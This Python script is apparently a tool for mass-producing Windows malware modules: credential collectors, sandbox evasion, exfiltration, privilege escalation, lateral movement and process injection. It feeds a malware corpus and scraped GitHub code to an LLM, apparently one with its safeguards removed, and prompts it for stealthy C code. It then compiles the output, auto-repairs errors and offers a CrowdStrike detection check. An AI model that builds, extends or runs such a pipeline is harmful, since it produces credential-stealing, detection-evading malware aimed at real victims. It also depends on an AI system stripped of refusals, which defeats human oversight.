#!/usr/bin/env python3
"""
Chunk Expansion Mode - Create new chunks with LLM assistance and validation.

Usage:
    python3 expand.py --type collector --description "Harvest Firefox saved passwords"
    python3 expand.py --type evasion --description "Anti-sandbox using accelerometer"
    python3 expand.py --type collector --description "Extract Telegram session files" --validate
"""

import argparse
import os
import re
import subprocess
import sys
import tempfile
from datetime import datetime
from pathlib import Path

import yaml

FRAMEWORK_ROOT = Path(__file__).parent
CHUNKS_DIR = FRAMEWORK_ROOT / "templates" / "chunks"

# ChromaDB for reference code
CHROMA_PATH = Path("/home/kei/llm_vault/malware_corpus/data/chroma")

# LLM endpoint
LLM_URL = os.environ.get("LLM_URL", "http://localhost:11235/v1")
LLM_MODEL = os.environ.get("LLM_MODEL", "huihui-qwen3.6-35b-a3b-claude-4.7-opus-abliterated-mtp")

CHUNK_TEMPLATE = '''// chunk: {category}/{name}
// depends: {depends}
// provides: {provides}
// created: {date}
// note: {description}

#ifndef CHUNK_{guard}
#define CHUNK_{guard}

{code}

#endif
'''


def query_chroma(query: str, n_results: int = 5) -> list[dict]:
    """Query ChromaDB for reference code."""
    try:
        import chromadb
        client = chromadb.PersistentClient(path=str(CHROMA_PATH))
        collection = client.get_collection("malware_techniques")
        results = collection.query(
            query_texts=[query],
            n_results=n_results,
            where={"language": "c_cpp"}
        )
        return [
            {"code": doc, "metadata": meta}
            for doc, meta in zip(results["documents"][0], results["metadatas"][0])
        ]
    except Exception as e:
        print(f"ChromaDB query failed: {e}", file=sys.stderr)
        return []


def search_web(query: str, num_results: int = 5) -> list[dict]:
    """Search the web for recent techniques and code samples."""
    try:
        import httpx
        # Use DuckDuckGo HTML search (no API key needed)
        search_url = "https://html.duckduckgo.com/html/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        # Add security/malware context to query
        full_query = f"{query} site:github.com OR site:gist.github.com filetype:c"

        response = httpx.post(
            search_url,
            data={"q": full_query},
            headers=headers,
            timeout=15,
            follow_redirects=True
        )

        if response.status_code != 200:
            print(f"  Web search returned {response.status_code}", file=sys.stderr)
            return []

        # Parse results (basic HTML parsing)
        from html.parser import HTMLParser
        results = []

        class DDGParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.in_result = False
                self.current = {}

            def handle_starttag(self, tag, attrs):
                attrs_dict = dict(attrs)
                if tag == "a" and "result__a" in attrs_dict.get("class", ""):
                    self.in_result = True
                    self.current = {"url": attrs_dict.get("href", ""), "title": ""}

            def handle_data(self, data):
                if self.in_result and self.current:
                    self.current["title"] += data.strip()

            def handle_endtag(self, tag):
                if tag == "a" and self.in_result:
                    if self.current.get("url") and self.current.get("title"):
                        results.append(self.current)
                    self.in_result = False
                    self.current = {}

        parser = DDGParser()
        parser.feed(response.text)

        # Fetch actual code from GitHub links
        code_results = []
        for r in results[:num_results]:
            url = r.get("url", "")
            if "github.com" in url and ("/blob/" in url or "gist.github" in url):
                try:
                    # Convert to raw URL
                    raw_url = url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                    if "gist.github" in url:
                        raw_url = url.replace("gist.github.com", "gist.githubusercontent.com") + "/raw"

                    code_resp = httpx.get(raw_url, headers=headers, timeout=10, follow_redirects=True)
                    if code_resp.status_code == 200 and len(code_resp.text) < 50000:
                        code_results.append({
                            "url": url,
                            "title": r.get("title", ""),
                            "code": code_resp.text[:3000]  # Limit code size
                        })
                except Exception:
                    pass

        return code_results
    except Exception as e:
        print(f"Web search failed: {e}", file=sys.stderr)
        return []


def call_llm(prompt: str, max_tokens: int = 4096) -> str:
    """Call local LLM for code generation."""
    try:
        import requests
        response = requests.post(
            f"{LLM_URL}/chat/completions",
            json={
                "model": LLM_MODEL,
                "messages": [{"role": "user", "content": prompt}],
                "max_tokens": max_tokens,
                "temperature": 0.3,
            },
            timeout=120
        )
        response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        print(f"LLM call failed: {e}", file=sys.stderr)
        return ""


def generate_chunk_name(description: str, chunk_type: str) -> str:
    """Generate a chunk name from description."""
    # Extract key words
    words = re.findall(r'\b[a-z]+\b', description.lower())
    # Filter common words
    stopwords = {'the', 'a', 'an', 'and', 'or', 'for', 'to', 'from', 'with', 'in', 'on', 'at', 'by'}
    words = [w for w in words if w not in stopwords and len(w) > 2]
    # Take first 2-3 words
    name_parts = words[:3]
    return "_".join(name_parts) if name_parts else f"new_{chunk_type}"


def generate_chunk_code(description: str, chunk_type: str, reference_code: list[dict]) -> tuple[str, dict]:
    """Generate chunk code using LLM."""
    # Build prompt with references from corpus and web
    corpus_refs = []
    web_refs = []
    for r in reference_code[:6]:
        source = r['metadata'].get('source', r['metadata'].get('source_file', 'unknown'))
        snippet = f"// Reference from {source}:\n{r['code'][:1200]}"
        if 'http' in source or 'github' in source:
            web_refs.append(snippet)
        else:
            corpus_refs.append(snippet)

    ref_section = ""
    if corpus_refs:
        ref_section += "=== MALWARE CORPUS REFERENCES ===\n" + "\n\n".join(corpus_refs[:3]) + "\n\n"
    if web_refs:
        ref_section += "=== WEB RESEARCH REFERENCES (recent) ===\n" + "\n\n".join(web_refs[:3]) + "\n\n"

    category_map = {
        "collector": "collectors",
        "evasion": "evasion",
        "exfil": "exfil",
        "privesc": "privesc",
        "lateral": "lateral",
        "injection": "injection",
    }
    category = category_map.get(chunk_type, chunk_type)

    prompt = f"""Generate a Windows C malware chunk for: {description}

Chunk type: {chunk_type}
Category path: {category}/

Requirements:
1. Pure C code (no C++), compatible with MinGW cross-compilation (x86_64-w64-mingw32-gcc)
2. Use Windows API functions (include appropriate headers)
3. Follow the chunk format with a main function named appropriately:
   - For collectors: collect_<name>() that calls emit() to output data
   - For evasion: check_<name>() or init_<name>() that returns success/failure
   - For exfil: exfiltrate(const char *addr, int port, const char *data, DWORD len)
   - For privesc: elevate_<name>() or bypass_<name>() that returns success/failure
   - For lateral: lateral_<name>(target, command, ...) that executes on remote host
   - For injection: inject_<name>(pid, shellcode, size) that injects into target process
4. Use dynamic API loading (LoadLibraryA/GetProcAddress) for sensitive APIs to avoid static imports
5. Handle errors gracefully (don't crash, return error codes)
6. No debug output or printf to console
7. Use modern techniques from the reference code - they are from real malware and recent research

{ref_section}
Output ONLY the C code, no explanation. The code should be a complete chunk that can be included in a larger payload.
Start with the function definition directly (no #include, those go in metadata).
"""

    code = call_llm(prompt)

    # Clean up code
    code = re.sub(r'^```c?\n?', '', code)
    code = re.sub(r'\n?```$', '', code)
    code = code.strip()

    # Extract metadata
    metadata = {
        "depends": ["core/emit_buffer"] if chunk_type == "collector" else [],
        "provides": [],
        "headers": ["windows.h"],
    }

    # Detect dependencies from code
    if "emit(" in code or "emit_section(" in code:
        metadata["depends"].append("core/emit_buffer")
    if "LoadLibraryA" in code or "GetProcAddress" in code:
        pass  # Standard Windows API
    if "SOCKET" in code or "WSA" in code:
        metadata["headers"].append("winsock2.h")
        metadata["libs"] = ["ws2_32"]
    if "LDAP" in code:
        metadata["headers"].append("winldap.h")
        metadata["libs"] = ["wldap32"]

    # Detect provided functions
    fn_matches = re.findall(r'\b(collect_\w+|check_\w+|init_\w+|exfiltrate)\s*\(', code)
    metadata["provides"] = list(set(fn_matches))

    return code, metadata


def compile_test(chunk_path: Path) -> tuple[bool, str]:
    """Test if chunk compiles."""
    with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
        # Create minimal test wrapper
        chunk_code = chunk_path.read_text()
        test_code = f'''
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Stub for emit
static char _buf[65536];
static int _buf_len = 0;
static void emit(const char *fmt, ...) {{ }}
static void emit_section(const char *name) {{ }}

{chunk_code}

int main() {{ return 0; }}
'''
        f.write(test_code.encode())
        test_path = f.name

    try:
        exe_path = test_path.replace(".c", ".exe")
        result = subprocess.run(
            ["x86_64-w64-mingw32-gcc", "-o", exe_path, test_path,
             "-lws2_32", "-liphlpapi", "-static", "-w"],
            capture_output=True,
            text=True,
            timeout=30
        )
        os.unlink(test_path)
        if os.path.exists(exe_path):
            os.unlink(exe_path)
        return result.returncode == 0, result.stderr
    except Exception as e:
        return False, str(e)


def fix_compilation_errors(code: str, error: str, attempt: int) -> str:
    """Use LLM to fix compilation errors."""
    prompt = f"""Fix the following C code compilation errors.

Error message:
{error[:2000]}

Current code:
{code}

Output ONLY the fixed C code, no explanation. Keep the same function signatures.
"""
    fixed = call_llm(prompt)
    fixed = re.sub(r'^```c?\n?', '', fixed)
    fixed = re.sub(r'\n?```$', '', fixed)
    return fixed.strip()


def create_chunk(chunk_type: str, description: str, validate: bool = False,
                 max_attempts: int = 5) -> tuple[bool, Path | None]:
    """
    Create a new chunk.

    Returns: (success, chunk_path)
    """
    print(f"Creating {chunk_type} chunk: {description}")

    # Generate name
    name = generate_chunk_name(description, chunk_type)
    category_map = {
        "collector": "collectors",
        "evasion": "evasion",
        "exfil": "exfil",
        "privesc": "privesc",
        "lateral": "lateral",
        "injection": "injection",
    }
    category = category_map.get(chunk_type, chunk_type)
    chunk_path = CHUNKS_DIR / category / f"{name}.c"

    # Check if exists
    if chunk_path.exists():
        print(f"  Chunk already exists: {chunk_path}")
        name = f"{name}_{datetime.now().strftime('%H%M%S')}"
        chunk_path = CHUNKS_DIR / category / f"{name}.c"

    print(f"  Name: {category}/{name}")

    # Query reference code from ChromaDB
    print("  Querying malware corpus (ChromaDB)...")
    references = query_chroma(description)
    print(f"  Found {len(references)} corpus references")

    # Search web for recent techniques
    print("  Searching web for recent techniques...")
    web_refs = search_web(f"{chunk_type} {description} windows c code")
    print(f"  Found {len(web_refs)} web references")

    # Combine references (corpus first, then web)
    all_references = references + [
        {"code": w["code"], "metadata": {"source": w["url"], "title": w["title"]}}
        for w in web_refs
    ]

    # Generate code
    print("  Generating code...")
    code, metadata = generate_chunk_code(description, chunk_type, all_references)

    if not code:
        print("  Failed to generate code")
        return False, None

    # Build chunk file
    chunk_content = CHUNK_TEMPLATE.format(
        category=category,
        name=name,
        depends=", ".join(metadata.get("depends", [])) or "(none)",
        provides=", ".join(metadata.get("provides", [])),
        date=datetime.now().strftime("%Y-%m-%d"),
        description=description,
        guard=f"{category.upper()}_{name.upper()}",
        code=code,
    )

    # Write chunk
    chunk_path.write_text(chunk_content)
    print(f"  Written: {chunk_path}")

    # Compile test
    print("  Testing compilation...")
    for attempt in range(max_attempts):
        success, error = compile_test(chunk_path)
        if success:
            print("  ✓ Compilation successful")
            break
        else:
            print(f"  ✗ Compilation failed (attempt {attempt + 1}/{max_attempts})")
            if attempt < max_attempts - 1:
                print("  Attempting fix...")
                code = fix_compilation_errors(code, error, attempt)
                chunk_content = CHUNK_TEMPLATE.format(
                    category=category,
                    name=name,
                    depends=", ".join(metadata.get("depends", [])) or "(none)",
                    provides=", ".join(metadata.get("provides", [])),
                    date=datetime.now().strftime("%Y-%m-%d"),
                    description=description,
                    guard=f"{category.upper()}_{name.upper()}",
                    code=code,
                )
                chunk_path.write_text(chunk_content)
    else:
        print(f"  Failed after {max_attempts} attempts")
        # Keep the file but mark as broken
        chunk_path.unlink()
        return False, None

    # Add to registry
    print("  Adding to registry...")
    sys.path.insert(0, str(CHUNKS_DIR))
    from registry import add_chunk
    add_chunk(f"{category}/{name}", status="enabled", tags=["new"], note=description)

    # Validate if requested
    if validate:
        print("  Running CrowdStrike validation...")
        from validate import test_chunk
        # Would need to implement this properly
        print("  (Validation not yet implemented in expand mode)")

    print(f"  ✓ Created: {category}/{name}")
    return True, chunk_path


def main():
    parser = argparse.ArgumentParser(description="Create new chunks with LLM assistance")
    parser.add_argument("--type", required=True,
                        choices=["collector", "evasion", "exfil", "privesc", "lateral", "injection"],
                        help="Type of chunk to create")
    parser.add_argument("--description", required=True, help="Description of what the chunk should do")
    parser.add_argument("--count", type=int, default=1, help="Number of variants to create")
    parser.add_argument("--validate", action="store_true", help="Validate against CrowdStrike")
    parser.add_argument("--max-attempts", type=int, default=5, help="Max attempts to fix compilation")
    args = parser.parse_args()

    print("=" * 60)
    print("CHUNK EXPANSION MODE")
    print("=" * 60)
    print(f"Type: {args.type}")
    print(f"Description: {args.description}")
    print(f"Count: {args.count}")
    print()

    successes = []
    failures = []

    for i in range(args.count):
        if args.count > 1:
            print(f"\n--- Variant {i + 1}/{args.count} ---")

        success, path = create_chunk(
            args.type,
            args.description,
            validate=args.validate,
            max_attempts=args.max_attempts
        )

        if success:
            successes.append(path)
        else:
            failures.append(i + 1)

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Created: {len(successes)}/{args.count}")

    if successes:
        print("\nSuccessful chunks:")
        for p in successes:
            print(f"  ✓ {p}")

    if failures:
        print(f"\nFailed variants: {failures}")

    sys.exit(0 if successes else 1)


if __name__ == "__main__":
    main()
